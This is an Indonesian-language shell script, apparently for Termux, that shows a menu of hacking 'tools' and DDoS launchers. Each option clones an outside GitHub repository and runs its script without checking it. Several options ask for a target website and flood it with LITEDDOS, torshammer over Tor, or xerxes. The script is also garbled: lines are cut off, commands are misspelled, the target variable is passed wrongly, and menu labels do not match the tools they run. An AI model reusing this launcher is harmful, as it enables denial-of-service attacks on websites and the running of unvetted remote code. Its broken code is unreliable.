
#Jangan Recode
#Pahami
#Pelajari

blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'

clear
figlet Anonymous | lolcat
cd $HOME
echo -n $cyan"Anda memakai tools ini pada tanggal "; date >
echo "\033[36;1m[]========================================>
echo "\033[37;1m[] AUTHOR :  Mr.Zack                      >
echo "\033[32;1m[] TEAM   : Cyber Indonsia                >
echo "\033[36;1m[]========================================>
echo $cyan"[+]============================================>
echo $cyab"                      SELAMAT DATANG"|lolcat
echo $cyan"[+]============================================>
echo  "___________________________________________________>
echo
echo $cyan"1) Tools TUANBADUTv4 Rusak"
echo
echo $cyan"2) Tools TUANBADUTv4"
echo
echo $white"3) Tools BAJINGANv5"
echo
echo $blue"4) Tools BAJINGANv6"
echo
echo $purple"5) Hammer buat ddos"
echo
echo $red"6) Lite -Ddos buat ddos"
echo
echo $yellow"7) Xerxes buat ddos"
echo
echo $green"8) Torhammer buat ddos"
echo "____________________________________________________>
echo
echo "\033[32;1m╭──=>>[PILIH NOMORNYA]"
read -p "╰──────────────────────────> : " bos

if [ $bos = 1 ] || [ $bos = 1 ]
then
clear
figlet -f slant "Loading . . " | lolcat
pkg install python python2 vim figlet curl
pkg install php
pip2 install lolcat
pjg install git
git clone https://github.com/TUANB4DUT/TOOLSINSTALLERv1
cd TOOLSINSTALLERv1
chmod +x Tuanb4dut.sh
sh Tuanb4dut.sh
mv TOOLSINSTALLERv1 module
fi

if [ $bos = 2 ] || [ $bos = 2 ]
then
clear
figlet -f slant "Loading . . " | lolcat                   >
pkg install php                                           >
pkg install git
git clone https://github.com/TUANB4DUT/TOOLSINSTALLERv4
cd TOOLSINSTALLERv4
ls
chmod 777 TUANB4DUT..sh
./TUANB4DUT..sh
fi

if [ $bos = 3 ] || [ $bos = 3 ]
then
clear
figlet -f slant "Loading . . " | lolcat
pkg install git
pkg insatll toilet
pkg install figlet
pip2 install lolcat
git clone https://github.com/DarknessCyberTeam/B4J1N64Nv5
cd B4J1N64Nv5
sh B4J1N64N.sh
fi

if [ $bos = 4 ] || [ $bos = 4 ]
then
clear
figlet -f slant "Loading . . " | lolcat                   >
git clone https://github.com/DarknessCyberTeam/BAJINGANv6
ls
cd BAJINGANv6
sh BAJINGAN.sh
fi

if [ $bos = 6 ] || [ $bos = 6 ]
then
clear
figlet -f slant "Loading . . " | lolcat
apt install git
git clone https://github.com/4L13199/LITEDDOS
mv LITEDDOS $HOME
cd $HOME/LITEDDOS
read -p "MasukanTarget:" target
python2 LITEDDOS.py target 80 100
fi

if [ $bos = 7 ] || [ $bos = 7 ]
then
clear
figlet -f slant "Loading . . " | lolcat
clear
apt update
apt install git
apt install tor
git clone https://github.com/dotfighter/torshammer.git
mv torshammer $HOME
cd $HOME/torshammer
read -p "Masukan Target==>:" target
python2 torshammer.py -T -t target
fi

if [ $bos = 8 ] || [ $bos = 8 ]
then
clear
figlet -f slant "Loading . . " | lolcat
apt install git                                           >
git clone https://github.com/zanyarjamal/xerxes
mv xerxes $HOME
cd $HOME/xerxes
clang xerxes.c -o xerxes
clear
read -p "[masukanWebsiteTarget]>" target
./xerxes target 80
fi

if [ $bos = 00 ] || [ $bos = 00 ]
then
clear                                                     >
fi
if [ $bos = * ] || [ $bos = * ]
then
echo "ERROR NOT FOUND"|lolcat
fi

exit
